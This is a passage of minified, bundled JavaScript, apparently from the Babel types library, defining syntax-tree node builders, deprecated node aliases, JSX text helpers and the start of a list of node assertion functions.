D(J.typeAnnotation,Q,"typeAnnotation",X,1),Q}function l11(X){let Q={type:"TSTypeParameterInstantiation",params:X},J=f.TSTypeParameterInstantiation;return D(J.params,Q,"params",X,1),Q}function p11(X){let Q={type:"TSTypeParameterDeclaration",params:X},J=f.TSTypeParameterDeclaration;return D(J.params,Q,"params",X,1),Q}function d11(X=null,Q=null,J){let Y={type:"TSTypeParameter",constraint:X,default:Q,name:J},W=f.TSTypeParameter;return D(W.constraint,Y,"constraint",X,1),D(W.default,Y,"default",Q,1),D(W.name,Y,"name",J),Y}function i11(X){return(0,BY.default)("NumberLiteral","NumericLiteral","The node type "),x3(X)}function r11(X,Q=""){return(0,BY.default)("RegexLiteral","RegExpLiteral","The node type "),f3(X,Q)}function n11(X){return(0,BY.default)("RestProperty","RestElement","The node type "),h3(X)}function a11(X){return(0,BY.default)("SpreadProperty","SpreadElement","The node type "),y3(X)}});var p3=m((m3)=>{Object.defineProperty(m3,"__esModule",{value:!0});m3.JSXIdentifier=m3.JSXFragment=m3.JSXExpressionContainer=m3.JSXEmptyExpression=m3.JSXElement=m3.JSXClosingFragment=m3.JSXClosingElement=m3.JSXAttribute=m3.IntersectionTypeAnnotation=m3.InterpreterDirective=m3.InterfaceTypeAnnotation=m3.InterfaceExtends=m3.InterfaceDeclaration=m3.InferredPredicate=m3.IndexedAccessType=m3.ImportSpecifier=m3.ImportNamespaceSpecifier=m3.ImportExpression=m3.ImportDefaultSpecifier=m3.ImportDeclaration=m3.ImportAttribute=m3.Import=m3.IfStatement=m3.Identifier=m3.GenericTypeAnnotation=m3.FunctionTypeParam=m3.FunctionTypeAnnotation=m3.FunctionExpression=m3.FunctionDeclaration=m3.ForStatement=m3.ForOfStatement=m3.ForInStatement=m3.File=m3.ExpressionStatement=m3.ExportSpecifier=m3.ExportNamespaceSpecifier=m3.ExportNamedDeclaration=m3.ExportDefaultSpecifier=m3.ExportDefaultDeclaration=m3.ExportAllDeclaration=m3.ExistsTypeAnnotation=m3.EnumSymbolBody=m3.EnumStringMember=m3.EnumStringBody=m3.EnumNumberMember=m3.EnumNumberBody=m3.EnumDefaultedMember=m3.EnumDeclaration=m3.EnumBooleanMember=m3.EnumBooleanBody=m3.EmptyTypeAnnotation=m3.EmptyStatement=m3.DoWhileStatement=m3.DoExpression=m3.DirectiveLiteral=m3.Directive=m3.Decorator=m3.DeclaredPredicate=m3.DeclareVariable=m3.DeclareTypeAlias=m3.DeclareOpaqueType=m3.DeclareModuleExports=m3.DeclareModule=m3.DeclareInterface=m3.DeclareFunction=m3.DeclareExportDeclaration=m3.DeclareExportAllDeclaration=m3.DeclareClass=m3.DecimalLiteral=m3.DebuggerStatement=m3.ContinueStatement=m3.ConditionalExpression=m3.ClassProperty=m3.ClassPrivateProperty=m3.ClassPrivateMethod=m3.ClassMethod=m3.ClassImplements=m3.ClassExpression=m3.ClassDeclaration=m3.ClassBody=m3.ClassAccessorProperty=m3.CatchClause=m3.CallExpression=m3.BreakStatement=m3.BooleanTypeAnnotation=m3.BooleanLiteralTypeAnnotation=m3.BooleanLiteral=m3.BlockStatement=m3.BindExpression=m3.BinaryExpression=m3.BigIntLiteral=m3.AwaitExpression=m3.AssignmentPattern=m3.AssignmentExpression=m3.ArrowFunctionExpression=m3.ArrayTypeAnnotation=m3.ArrayPattern=m3.ArrayExpression=m3.ArgumentPlaceholder=m3.AnyTypeAnnotation=void 0;m3.TSNumberKeyword=m3.TSNullKeyword=m3.TSNonNullExpression=m3.TSNeverKeyword=m3.TSNamespaceExportDeclaration=m3.TSNamedTupleMember=m3.TSModuleDeclaration=m3.TSModuleBlock=m3.TSMethodSignature=m3.TSMappedType=m3.TSLiteralType=m3.TSIntrinsicKeyword=m3.TSIntersectionType=m3.TSInterfaceDeclaration=m3.TSInterfaceBody=m3.TSInstantiationExpression=m3.TSInferType=m3.TSIndexedAccessType=m3.TSIndexSignature=m3.TSImportType=m3.TSImportEqualsDeclaration=m3.TSFunctionType=m3.TSExternalModuleReference=m3.TSExpressionWithTypeArguments=m3.TSExportAssignment=m3.TSEnumMember=m3.TSEnumDeclaration=m3.TSEnumBody=m3.TSDeclareMethod=m3.TSDeclareFunction=m3.TSConstructorType=m3.TSConstructSignatureDeclaration=m3.TSConditionalType=m3.TSCallSignatureDeclaration=m3.TSBooleanKeyword=m3.TSBigIntKeyword=m3.TSAsExpression=m3.TSArrayType=m3.TSAnyKeyword=m3.SymbolTypeAnnotation=m3.SwitchStatement=m3.SwitchCase=m3.Super=m3.StringTypeAnnotation=m3.StringLiteralTypeAnnotation=m3.StringLiteral=m3.StaticBlock=m3.SpreadProperty=m3.SpreadElement=m3.SequenceExpression=m3.ReturnStatement=m3.RestProperty=m3.RestElement=m3.RegexLiteral=m3.RegExpLiteral=m3.RecordExpression=m3.QualifiedTypeIdentifier=m3.Program=m3.PrivateName=m3.Placeholder=m3.PipelineTopicExpression=m3.PipelinePrimaryTopicReference=m3.PipelineBareFunction=m3.ParenthesizedExpression=m3.OptionalMemberExpression=m3.OptionalIndexedAccessType=m3.OptionalCallExpression=m3.OpaqueType=m3.ObjectTypeSpreadProperty=m3.ObjectTypeProperty=m3.ObjectTypeInternalSlot=m3.ObjectTypeIndexer=m3.ObjectTypeCallProperty=m3.ObjectTypeAnnotation=m3.ObjectProperty=m3.ObjectPattern=m3.ObjectMethod=m3.ObjectExpression=m3.NumericLiteral=m3.NumberTypeAnnotation=m3.NumberLiteralTypeAnnotation=m3.NumberLiteral=m3.NullableTypeAnnotation=m3.NullLiteralTypeAnnotation=m3.NullLiteral=m3.Noop=m3.NewExpression=m3.ModuleExpression=m3.MixedTypeAnnotation=m3.MetaProperty=m3.MemberExpression=m3.LogicalExpression=m3.LabeledStatement=m3.JSXText=m3.JSXSpreadChild=m3.JSXSpreadAttribute=m3.JSXOpeningFragment=m3.JSXOpeningElement=m3.JSXNamespacedName=m3.JSXMemberExpression=void 0;m3.YieldExpression=m3.WithStatement=m3.WhileStatement=m3.VoidTypeAnnotation=m3.VoidPattern=m3.Variance=m3.VariableDeclarator=m3.VariableDeclaration=m3.V8IntrinsicIdentifier=m3.UpdateExpression=m3.UnionTypeAnnotation=m3.UnaryExpression=m3.TypeofTypeAnnotation=m3.TypeParameterInstantiation=m3.TypeParameterDeclaration=m3.TypeParameter=m3.TypeCastExpression=m3.TypeAnnotation=m3.TypeAlias=m3.TupleTypeAnnotation=m3.TupleExpression=m3.TryStatement=m3.TopicReference=m3.ThrowStatement=m3.ThisTypeAnnotation=m3.ThisExpression=m3.TemplateLiteral=m3.TemplateElement=m3.TaggedTemplateExpression=m3.TSVoidKeyword=m3.TSUnknownKeyword=m3.TSUnionType=m3.TSUndefinedKeyword=m3.TSTypeReference=m3.TSTypeQuery=m3.TSTypePredicate=m3.TSTypeParameterInstantiation=m3.TSTypeParameterDeclaration=m3.TSTypeParameter=m3.TSTypeOperator=m3.TSTypeLiteral=m3.TSTypeAssertion=m3.TSTypeAnnotation=m3.TSTypeAliasDeclaration=m3.TSTupleType=m3.TSThisType=m3.TSTemplateLiteralType=m3.TSSymbolKeyword=m3.TSStringKeyword=m3.TSSatisfiesExpression=m3.TSRestType=m3.TSQualifiedName=m3.TSPropertySignature=m3.TSParenthesizedType=m3.TSParameterProperty=m3.TSOptionalType=m3.TSObjectKeyword=void 0;var u4=U$(),IX0=G5();function b(X){return u4[X]}var CX0=m3.ArrayExpression=b("arrayExpression"),PX0=m3.AssignmentExpression=b("assignmentExpression"),SX0=m3.BinaryExpression=b("binaryExpression"),EX0=m3.InterpreterDirective=b("interpreterDirective"),TX0=m3.Directive=b("directive"),_X0=m3.DirectiveLiteral=b("directiveLiteral"),kX0=m3.BlockStatement=b("blockStatement"),bX0=m3.BreakStatement=b("breakStatement"),vX0=m3.CallExpression=b("callExpression"),xX0=m3.CatchClause=b("catchClause"),fX0=m3.ConditionalExpression=b("conditionalExpression"),hX0=m3.ContinueStatement=b("continueStatement"),yX0=m3.DebuggerStatement=b("debuggerStatement"),gX0=m3.DoWhileStatement=b("doWhileStatement"),mX0=m3.EmptyStatement=b("emptyStatement"),uX0=m3.ExpressionStatement=b("expressionStatement"),cX0=m3.File=b("file"),lX0=m3.ForInStatement=b("forInStatement"),pX0=m3.ForStatement=b("forStatement"),dX0=m3.FunctionDeclaration=b("functionDeclaration"),iX0=m3.FunctionExpression=b("functionExpression"),rX0=m3.Identifier=b("identifier"),nX0=m3.IfStatement=b("ifStatement"),aX0=m3.LabeledStatement=b("labeledStatement"),oX0=m3.StringLiteral=b("stringLiteral"),sX0=m3.NumericLiteral=b("numericLiteral"),tX0=m3.NullLiteral=b("nullLiteral"),eX0=m3.BooleanLiteral=b("booleanLiteral"),X70=m3.RegExpLiteral=b("regExpLiteral"),Q70=m3.LogicalExpression=b("logicalExpression"),J70=m3.MemberExpression=b("memberExpression"),Y70=m3.NewExpression=b("newExpression"),W70=m3.Program=b("program"),G70=m3.ObjectExpression=b("objectExpression"),H70=m3.ObjectMethod=b("objectMethod"),$70=m3.ObjectProperty=b("objectProperty"),z70=m3.RestElement=b("restElement"),U70=m3.ReturnStatement=b("returnStatement"),K70=m3.SequenceExpression=b("sequenceExpression"),V70=m3.ParenthesizedExpression=b("parenthesizedExpression"),B70=m3.SwitchCase=b("switchCase"),q70=m3.SwitchStatement=b("switchStatement"),Z70=m3.ThisExpression=b("thisExpression"),M70=m3.ThrowStatement=b("throwStatement"),j70=m3.TryStatement=b("tryStatement"),F70=m3.UnaryExpression=b("unaryExpression"),O70=m3.UpdateExpression=b("updateExpression"),A70=m3.VariableDeclaration=b("variableDeclaration"),R70=m3.VariableDeclarator=b("variableDeclarator"),L70=m3.WhileStatement=b("whileStatement"),D70=m3.WithStatement=b("withStatement"),N70=m3.AssignmentPattern=b("assignmentPattern"),w70=m3.ArrayPattern=b("arrayPattern"),I70=m3.ArrowFunctionExpression=b("arrowFunctionExpression"),C70=m3.ClassBody=b("classBody"),P70=m3.ClassExpression=b("classExpression"),S70=m3.ClassDeclaration=b("classDeclaration"),E70=m3.ExportAllDeclaration=b("exportAllDeclaration"),T70=m3.ExportDefaultDeclaration=b("exportDefaultDeclaration"),_70=m3.ExportNamedDeclaration=b("exportNamedDeclaration"),k70=m3.ExportSpecifier=b("exportSpecifier"),b70=m3.ForOfStatement=b("forOfStatement"),v70=m3.ImportDeclaration=b("importDeclaration"),x70=m3.ImportDefaultSpecifier=b("importDefaultSpecifier"),f70=m3.ImportNamespaceSpecifier=b("importNamespaceSpecifier"),h70=m3.ImportSpecifier=b("importSpecifier"),y70=m3.ImportExpression=b("importExpression"),g70=m3.MetaProperty=b("metaProperty"),m70=m3.ClassMethod=b("classMethod"),u70=m3.ObjectPattern=b("objectPattern"),c70=m3.SpreadElement=b("spreadElement"),l70=m3.Super=b("super"),p70=m3.TaggedTemplateExpression=b("taggedTemplateExpression"),d70=m3.TemplateElement=b("templateElement"),i70=m3.TemplateLiteral=b("templateLiteral"),r70=m3.YieldExpression=b("yieldExpression"),n70=m3.AwaitExpression=b("awaitExpression"),a70=m3.Import=b("import"),o70=m3.BigIntLiteral=b("bigIntLiteral"),s70=m3.ExportNamespaceSpecifier=b("exportNamespaceSpecifier"),t70=m3.OptionalMemberExpression=b("optionalMemberExpression"),e70=m3.OptionalCallExpression=b("optionalCallExpression"),X50=m3.ClassProperty=b("classProperty"),Q50=m3.ClassAccessorProperty=b("classAccessorProperty"),J50=m3.ClassPrivateProperty=b("classPrivateProperty"),Y50=m3.ClassPrivateMethod=b("classPrivateMethod"),W50=m3.PrivateName=b("privateName"),G50=m3.StaticBlock=b("staticBlock"),H50=m3.ImportAttribute=b("importAttribute"),$50=m3.AnyTypeAnnotation=b("anyTypeAnnotation"),z50=m3.ArrayTypeAnnotation=b("arrayTypeAnnotation"),U50=m3.BooleanTypeAnnotation=b("booleanTypeAnnotation"),K50=m3.BooleanLiteralTypeAnnotation=b("booleanLiteralTypeAnnotation"),V50=m3.NullLiteralTypeAnnotation=b("nullLiteralTypeAnnotation"),B50=m3.ClassImplements=b("classImplements"),q50=m3.DeclareClass=b("declareClass"),Z50=m3.DeclareFunction=b("declareFunction"),M50=m3.DeclareInterface=b("declareInterface"),j50=m3.DeclareModule=b("declareModule"),F50=m3.DeclareModuleExports=b("declareModuleExports"),O50=m3.DeclareTypeAlias=b("declareTypeAlias"),A50=m3.DeclareOpaqueType=b("declareOpaqueType"),R50=m3.DeclareVariable=b("declareVariable"),L50=m3.DeclareExportDeclaration=b("declareExportDeclaration"),D50=m3.DeclareExportAllDeclaration=b("declareExportAllDeclaration"),N50=m3.DeclaredPredicate=b("declaredPredicate"),w50=m3.ExistsTypeAnnotation=b("existsTypeAnnotation"),I50=m3.FunctionTypeAnnotation=b("functionTypeAnnotation"),C50=m3.FunctionTypeParam=b("functionTypeParam"),P50=m3.GenericTypeAnnotation=b("genericTypeAnnotation"),S50=m3.InferredPredicate=b("inferredPredicate"),E50=m3.InterfaceExtends=b("interfaceExtends"),T50=m3.InterfaceDeclaration=b("interfaceDeclaration"),_50=m3.InterfaceTypeAnnotation=b("interfaceTypeAnnotation"),k50=m3.IntersectionTypeAnnotation=b("intersectionTypeAnnotation"),b50=m3.MixedTypeAnnotation=b("mixedTypeAnnotation"),v50=m3.EmptyTypeAnnotation=b("emptyTypeAnnotation"),x50=m3.NullableTypeAnnotation=b("nullableTypeAnnotation"),f50=m3.NumberLiteralTypeAnnotation=b("numberLiteralTypeAnnotation"),h50=m3.NumberTypeAnnotation=b("numberTypeAnnotation"),y50=m3.ObjectTypeAnnotation=b("objectTypeAnnotation"),g50=m3.ObjectTypeInternalSlot=b("objectTypeInternalSlot"),m50=m3.ObjectTypeCallProperty=b("objectTypeCallProperty"),u50=m3.ObjectTypeIndexer=b("objectTypeIndexer"),c50=m3.ObjectTypeProperty=b("objectTypeProperty"),l50=m3.ObjectTypeSpreadProperty=b("objectTypeSpreadProperty"),p50=m3.OpaqueType=b("opaqueType"),d50=m3.QualifiedTypeIdentifier=b("qualifiedTypeIdentifier"),i50=m3.StringLiteralTypeAnnotation=b("stringLiteralTypeAnnotation"),r50=m3.StringTypeAnnotation=b("stringTypeAnnotation"),n50=m3.SymbolTypeAnnotation=b("symbolTypeAnnotation"),a50=m3.ThisTypeAnnotation=b("thisTypeAnnotation"),o50=m3.TupleTypeAnnotation=b("tupleTypeAnnotation"),s50=m3.TypeofTypeAnnotation=b("typeofTypeAnnotation"),t50=m3.TypeAlias=b("typeAlias"),e50=m3.TypeAnnotation=b("typeAnnotation"),X40=m3.TypeCastExpression=b("typeCastExpression"),Q40=m3.TypeParameter=b("typeParameter"),J40=m3.TypeParameterDeclaration=b("typeParameterDeclaration"),Y40=m3.TypeParameterInstantiation=b("typeParameterInstantiation"),W40=m3.UnionTypeAnnotation=b("unionTypeAnnotation"),G40=m3.Variance=b("variance"),H40=m3.VoidTypeAnnotation=b("voidTypeAnnotation"),$40=m3.EnumDeclaration=b("enumDeclaration"),z40=m3.EnumBooleanBody=b("enumBooleanBody"),U40=m3.EnumNumberBody=b("enumNumberBody"),K40=m3.EnumStringBody=b("enumStringBody"),V40=m3.EnumSymbolBody=b("enumSymbolBody"),B40=m3.EnumBooleanMember=b("enumBooleanMember"),q40=m3.EnumNumberMember=b("enumNumberMember"),Z40=m3.EnumStringMember=b("enumStringMember"),M40=m3.EnumDefaultedMember=b("enumDefaultedMember"),j40=m3.IndexedAccessType=b("indexedAccessType"),F40=m3.OptionalIndexedAccessType=b("optionalIndexedAccessType"),O40=m3.JSXAttribute=b("jsxAttribute"),A40=m3.JSXClosingElement=b("jsxClosingElement"),R40=m3.JSXElement=b("jsxElement"),L40=m3.JSXEmptyExpression=b("jsxEmptyExpression"),D40=m3.JSXExpressionContainer=b("jsxExpressionContainer"),N40=m3.JSXSpreadChild=b("jsxSpreadChild"),w40=m3.JSXIdentifier=b("jsxIdentifier"),I40=m3.JSXMemberExpression=b("jsxMemberExpression"),C40=m3.JSXNamespacedName=b("jsxNamespacedName"),P40=m3.JSXOpeningElement=b("jsxOpeningElement"),S40=m3.JSXSpreadAttribute=b("jsxSpreadAttribute"),E40=m3.JSXText=b("jsxText"),T40=m3.JSXFragment=b("jsxFragment"),_40=m3.JSXOpeningFragment=b("jsxOpeningFragment"),k40=m3.JSXClosingFragment=b("jsxClosingFragment"),b40=m3.Noop=b("noop"),v40=m3.Placeholder=b("placeholder"),x40=m3.V8IntrinsicIdentifier=b("v8IntrinsicIdentifier"),f40=m3.ArgumentPlaceholder=b("argumentPlaceholder"),h40=m3.BindExpression=b("bindExpression"),y40=m3.Decorator=b("decorator"),g40=m3.DoExpression=b("doExpression"),m40=m3.ExportDefaultSpecifier=b("exportDefaultSpecifier"),u40=m3.RecordExpression=b("recordExpression"),c40=m3.TupleExpression=b("tupleExpression"),l40=m3.DecimalLiteral=b("decimalLiteral"),p40=m3.ModuleExpression=b("moduleExpression"),d40=m3.TopicReference=b("topicReference"),i40=m3.PipelineTopicExpression=b("pipelineTopicExpression"),r40=m3.PipelineBareFunction=b("pipelineBareFunction"),n40=m3.PipelinePrimaryTopicReference=b("pipelinePrimaryTopicReference"),a40=m3.VoidPattern=b("voidPattern"),o40=m3.TSParameterProperty=b("tsParameterProperty"),s40=m3.TSDeclareFunction=b("tsDeclareFunction"),t40=m3.TSDeclareMethod=b("tsDeclareMethod"),e40=m3.TSQualifiedName=b("tsQualifiedName"),XQ0=m3.TSCallSignatureDeclaration=b("tsCallSignatureDeclaration"),QQ0=m3.TSConstructSignatureDeclaration=b("tsConstructSignatureDeclaration"),JQ0=m3.TSPropertySignature=b("tsPropertySignature"),YQ0=m3.TSMethodSignature=b("tsMethodSignature"),WQ0=m3.TSIndexSignature=b("tsIndexSignature"),GQ0=m3.TSAnyKeyword=b("tsAnyKeyword"),HQ0=m3.TSBooleanKeyword=b("tsBooleanKeyword"),$Q0=m3.TSBigIntKeyword=b("tsBigIntKeyword"),zQ0=m3.TSIntrinsicKeyword=b("tsIntrinsicKeyword"),UQ0=m3.TSNeverKeyword=b("tsNeverKeyword"),KQ0=m3.TSNullKeyword=b("tsNullKeyword"),VQ0=m3.TSNumberKeyword=b("tsNumberKeyword"),BQ0=m3.TSObjectKeyword=b("tsObjectKeyword"),qQ0=m3.TSStringKeyword=b("tsStringKeyword"),ZQ0=m3.TSSymbolKeyword=b("tsSymbolKeyword"),MQ0=m3.TSUndefinedKeyword=b("tsUndefinedKeyword"),jQ0=m3.TSUnknownKeyword=b("tsUnknownKeyword"),FQ0=m3.TSVoidKeyword=b("tsVoidKeyword"),OQ0=m3.TSThisType=b("tsThisType"),AQ0=m3.TSFunctionType=b("tsFunctionType"),RQ0=m3.TSConstructorType=b("tsConstructorType"),LQ0=m3.TSTypeReference=b("tsTypeReference"),DQ0=m3.TSTypePredicate=b("tsTypePredicate"),NQ0=m3.TSTypeQuery=b("tsTypeQuery"),wQ0=m3.TSTypeLiteral=b("tsTypeLiteral"),IQ0=m3.TSArrayType=b("tsArrayType"),CQ0=m3.TSTupleType=b("tsTupleType"),PQ0=m3.TSOptionalType=b("tsOptionalType"),SQ0=m3.TSRestType=b("tsRestType"),EQ0=m3.TSNamedTupleMember=b("tsNamedTupleMember"),TQ0=m3.TSUnionType=b("tsUnionType"),_Q0=m3.TSIntersectionType=b("tsIntersectionType"),kQ0=m3.TSConditionalType=b("tsConditionalType"),bQ0=m3.TSInferType=b("tsInferType"),vQ0=m3.TSParenthesizedType=b("tsParenthesizedType"),xQ0=m3.TSTypeOperator=b("tsTypeOperator"),fQ0=m3.TSIndexedAccessType=b("tsIndexedAccessType"),hQ0=m3.TSMappedType=b("tsMappedType"),yQ0=m3.TSTemplateLiteralType=b("tsTemplateLiteralType"),gQ0=m3.TSLiteralType=b("tsLiteralType"),mQ0=m3.TSExpressionWithTypeArguments=b("tsExpressionWithTypeArguments"),uQ0=m3.TSInterfaceDeclaration=b("tsInterfaceDeclaration"),cQ0=m3.TSInterfaceBody=b("tsInterfaceBody"),lQ0=m3.TSTypeAliasDeclaration=b("tsTypeAliasDeclaration"),pQ0=m3.TSInstantiationExpression=b("tsInstantiationExpression"),dQ0=m3.TSAsExpression=b("tsAsExpression"),iQ0=m3.TSSatisfiesExpression=b("tsSatisfiesExpression"),rQ0=m3.TSTypeAssertion=b("tsTypeAssertion"),nQ0=m3.TSEnumBody=b("tsEnumBody"),aQ0=m3.TSEnumDeclaration=b("tsEnumDeclaration"),oQ0=m3.TSEnumMember=b("tsEnumMember"),sQ0=m3.TSModuleDeclaration=b("tsModuleDeclaration"),tQ0=m3.TSModuleBlock=b("tsModuleBlock"),eQ0=m3.TSImportType=b("tsImportType"),XJ0=m3.TSImportEqualsDeclaration=b("tsImportEqualsDeclaration"),QJ0=m3.TSExternalModuleReference=b("tsExternalModuleReference"),JJ0=m3.TSNonNullExpression=b("tsNonNullExpression"),YJ0=m3.TSExportAssignment=b("tsExportAssignment"),WJ0=m3.TSNamespaceExportDeclaration=b("tsNamespaceExportDeclaration"),GJ0=m3.TSTypeAnnotation=b("tsTypeAnnotation"),HJ0=m3.TSTypeParameterInstantiation=b("tsTypeParameterInstantiation"),$J0=m3.TSTypeParameterDeclaration=b("tsTypeParameterDeclaration"),zJ0=m3.TSTypeParameter=b("tsTypeParameter"),UJ0=m3.NumberLiteral=u4.numberLiteral,KJ0=m3.RegexLiteral=u4.regexLiteral,VJ0=m3.RestProperty=u4.restProperty,BJ0=m3.SpreadProperty=u4.spreadProperty});var c9=m((qX)=>{Object.defineProperty(qX,"__esModule",{value:!0});var K$=U$();Object.keys(K$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in qX&&qX[X]===K$[X])return;Object.defineProperty(qX,X,{enumerable:!0,get:function(){return K$[X]}})});var V$=p3();Object.keys(V$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in qX&&qX[X]===V$[X])return;Object.defineProperty(qX,X,{enumerable:!0,get:function(){return V$[X]}})})});var i3=m((d3)=>{Object.defineProperty(d3,"__esModule",{value:!0});d3.default=NJ1;var LJ1=c9(),DJ1=$0();function NJ1(X,Q){let J=X.value.split(/\r\n|\n|\r/),Y=0;for(let G=0;G<J.length;G++)if(/[^ \t]/.exec(J[G]))Y=G;let W="";for(let G=0;G<J.length;G++){let H=J[G],$=G===0,z=G===J.length-1,U=G===Y,K=H.replace(/\t/g," ");if(!$)K=K.replace(/^ +/,"");if(!z)K=K.replace(/ +$/,"");if(K){if(!U)K+=" ";W+=K}}if(W)Q.push((0,DJ1.inherits)((0,LJ1.stringLiteral)(W),X))}});var n3=m((r3)=>{Object.defineProperty(r3,"__esModule",{value:!0});r3.default=CJ1;var B$=d0(),IJ1=i3();function CJ1(X){let Q=[];for(let J=0;J<X.children.length;J++){let Y=X.children[J];if((0,B$.isJSXText)(Y)){(0,IJ1.default)(Y,Q);continue}if((0,B$.isJSXExpressionContainer)(Y))Y=Y.expression;if((0,B$.isJSXEmptyExpression)(Y))continue;Q.push(Y)}return Q}});var q$=m((a3)=>{Object.defineProperty(a3,"__esModule",{value:!0});a3.default=EJ1;var SJ1=G6();function EJ1(X){return!!(X&&SJ1.VISITOR_KEYS[X.type])}});var s3=m((o3)=>{Object.defineProperty(o3,"__esModule",{value:!0});o3.default=kJ1;var _J1=q$();function kJ1(X){if(!(0,_J1.default)(X)){var Q;let J=(Q=X==null?void 0:X.type)!=null?Q:JSON.stringify(X);throw TypeError(`Not a valid node of type "${J}"`)}}});var e3=m((t3)=>{Object.defineProperty(t3,"__esModule",{value:!0});t3.assertAccessor=e$1;t3.assertAnyTypeAnnotation=jW1;t3.assertArgumentPlaceholder=dG1;t3.assertArrayExpression=xJ1;t3.assertArrayPattern=bY1;t3.assertArrayTypeAnnotation=FW1;t3.assertArrowFunctionExpression=vY1;t3.assertAssignmentExpression=fJ1;t3.assertAssignmentPattern=kY1;t3.assertAwaitExpression=YW1;t3.assertBigIntLiteral=GW1;t3.assertBinary=R$1;t3.assertBinaryExpression=hJ1;t3.assertBindExpression=iG1;t3.assertBlock=N$1;t3.assertBlockParent=D$1;t3.assertBlockStatement=uJ1;t3.assertBooleanLiteral=zY1;t3.assertBooleanLiteralTypeAnnotation=AW1;t3.assertBooleanTypeAnnotation=OW1;t3.assertBreakStatement=cJ1;t3.assertCallExpression=lJ1;t3.assertCatchClause=pJ1;t3.assertClass=a$1;t3.assertClassAccessorProperty=KW1;t3.assertClassBody=xY1;t3.assertClassDeclaration=hY1;t3.assertClassExpression=fY1;t3.assertClassImplements=LW1;t3.assertClassMethod=aY1;t3.assertClassPrivateMethod=BW1;t3.assertClassPrivateProperty=VW1;t3.assertClassProperty=UW1;t3.assertCompletionStatement=C$1;t3.assertConditional=P$1;t3.assertConditionalExpression=dJ1;t3.assertContinueStatement=iJ1;t3.assertDebuggerStatement=rJ1;t3.assertDecimalLiteral=tG1;t3.assertDeclaration=f$1;t3.assertDeclareClass=DW1;t3.assertDeclareExportAllDeclaration=_W1;t3.assertDeclareExportDeclaration=TW1;t3.assertDeclareFunction=NW1;t3.assertDeclareInterface=wW1;t3.assertDeclareModule=IW1;t3.assertDeclareModuleExports=CW1;t3.assertDeclareOpaqueType=SW1;t3.assertDeclareTypeAlias=PW1;t3.assertDeclareVariable=EW1;t3.assertDeclaredPredicate=kW1;t3.assertDecorator=rG1;t3.assertDirective=gJ1;t3.assertDirectiveLiteral=mJ1;t3.assertDoExpression=nG1;t3.assertDoWhileStatement=nJ1;t3.assertEmptyStatement=aJ1;t3.assertEmptyTypeAnnotation=lW1;t3.assertEnumBody=Hz1;t3.assertEnumBooleanBody=FG1;t3.assertEnumBooleanMember=LG1;t3.assertEnumDeclaration=jG1;t3.assertEnumDefaultedMember=wG1;t3.assertEnumMember=$z1;t3.assertEnumNumberBody=OG1;t3.assertEnumNumberMember=DG1;t3.assertEnumStringBody=AG1;t3.assertEnumStringMember=NG1;t3.assertEnumSymbolBody=RG1;t3.assertExistsTypeAnnotation=bW1;t3.assertExportAllDeclaration=yY1;t3.assertExportDeclaration=s$1;t3.assertExportDefaultDeclaration=gY1;t3.assertExportDefaultSpecifier=aG1;t3.assertExportNamedDeclaration=mY1;t3.assertExportNamespaceSpecifier=HW1;t3.assertExportSpecifier=uY1;t3.assertExpression=A$1;t3.assertExpressionStatement=oJ1;t3.assertExpressionWrapper=T$1;t3.assertFile=sJ1;t3.assertFlow=Qz1;t3.assertFlowBaseAnnotation=Yz1;t3.assertFlowDeclaration=Wz1;t3.assertFlowPredicate=Gz1;t3.assertFlowType=Jz1;t3.assertFor=_$1;t3.assertForInStatement=tJ1;t3.assertForOfStatement=cY1;t3.assertForStatement=eJ1;t3.assertForXStatement=k$1;t3.assertFunction=b$1;t3.assertFunctionDeclaration=XY1;t3.assertFunctionExpression=QY1;t3.assertFunctionParameter=h$1;t3.assertFunctionParent=v$1;t3.assertFunctionTypeAnnotation=vW1;t3.assertFunctionTypeParam=xW1;t3.assertGenericTypeAnnotation=fW1;t3.assertIdentifier=JY1;t3.assertIfStatement=YY1;t3.assertImmutable=c$1;t3.assertImport=WW1;t3.assertImportAttribute=MW1;t3.assertImportDeclaration=lY1;t3.assertImportDefaultSpecifier=pY1;t3.assertImportExpression=rY1;t3.assertImportNamespaceSpecifier=dY1;t3.assertImportOrExportDeclaration=o$1;t3.assertImportSpecifier=iY1;t3.assertIndexedAccessType=IG1;t3.assertInferredPredicate=hW1;t3.assertInterfaceDeclaration=gW1;t3.assertInterfaceExtends=yW1;t3.assertInterfaceTypeAnnotation=mW1;t3.assertInterpreterDirective=yJ1;t3.assertIntersectionTypeAnnotation=uW1;t3.assertJSX=zz1;t3.assertJSXAttribute=PG1;t3.assertJSXClosingElement=SG1;t3.assertJSXClosingFragment=uG1;t3.assertJSXElement=EG1;t3.assertJSXEmptyExpression=TG1;t3.assertJSXExpressionContainer=_G1;t3.assertJSXFragment=gG1;t3.assertJSXIdentifier=bG1;t3.assertJSXMemberExpression=vG1;t3.assertJSXNamespacedName=xG1;t3.assertJSXOpeningElement=fG1;t3.assertJSXOpeningFragment=mG1;t3.assertJSXSpreadAttribute=hG1;t3.assertJSXSpreadChild=kG1;t3.assertJSXText=yG1;t3.assertLVal=g$1;t3.assertLabeledStatement=WY1;t3.assertLiteral=u$1;t3.assertLogicalExpression=KY1;t3.assertLoop=S$1;t3.assertMemberExpression=VY1;t3.assertMetaProperty=nY1;t3.assertMethod=p$1;t3.assertMiscellaneous=Uz1;t3.assertMixedTypeAnnotation=cW1;t3.assertModuleDeclaration=Oz1;t3.assertModuleExpression=eG1;t3.assertModuleSpecifier=t$1;t3.assertNewExpression=BY1;t3.assertNoop=cG1;t3.assertNullLiteral=$Y1;t3.assertNullLiteralTypeAnnotation=RW1;t3.assertNullableTypeAnnotation=pW1;t3.assertNumberLiteral=Zz1;t3.assertNumberLiteralTypeAnnotation=dW1;t3.assertNumberTypeAnnotation=iW1;t3.assertNumericLiteral=HY1;t3.assertObjectExpression=ZY1;t3.assertObjectMember=d$1;t3.assertObjectMethod=MY1;t3.assertObjectPattern=oY1;t3.assertObjectProperty=jY1;t3.assertObjectTypeAnnotation=rW1;t3.assertObjectTypeCallProperty=aW1;t3.assertObjectTypeIndexer=oW1;t3.assertObjectTypeInternalSlot=nW1;t3.assertObjectTypeProperty=sW1;t3.assertObjectTypeSpreadProperty=tW1;t3.assertOpaqueType=eW1;t3.assertOptionalCallExpression=zW1;t3.assertOptionalIndexedAccessType=CG1;t3.assertOptionalMemberExpression=$W1;t3.assertParenthesizedExpression=RY1;t3.assertPattern=n$1;t3.assertPatternLike=y$1;t3.assertPipelineBareFunction=JH1;t3.assertPipelinePrimaryTopicReference=YH1;t3.assertPipelineTopicExpression=QH1;t3.asse